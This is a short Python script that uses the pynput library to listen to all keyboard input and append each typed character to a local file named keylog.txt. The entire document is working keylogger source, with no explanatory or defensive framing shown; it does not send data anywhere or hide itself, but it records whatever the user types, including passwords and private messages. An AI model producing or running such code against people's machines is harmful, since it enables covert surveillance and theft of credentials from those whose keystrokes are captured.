
from pynput import keyboard
import os

file = open("keylog.txt", "a")

def on_press(key):
    try:
        if key.char == ' ':
            file.write(' ')
        else:
            file.write(f"{key.char}")
        file.flush()
    except AttributeError:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

file.close()
